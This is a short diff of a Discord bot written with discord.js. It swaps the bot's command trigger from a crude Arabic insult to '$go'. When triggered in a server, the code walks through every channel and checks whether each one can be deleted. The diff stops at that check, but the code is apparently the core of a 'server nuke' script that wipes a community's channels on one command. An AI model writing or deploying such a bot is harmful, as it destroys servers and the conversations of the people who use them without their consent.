@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
  
 client.on('message', message =>{
-    if (message.content.startsWith('نيك امه')){
+    if (message.content.startsWith('$go')){
             if (message.channel.guild){
                 message.guild.channels.forEach(c =>{
                     if(c.deletable){
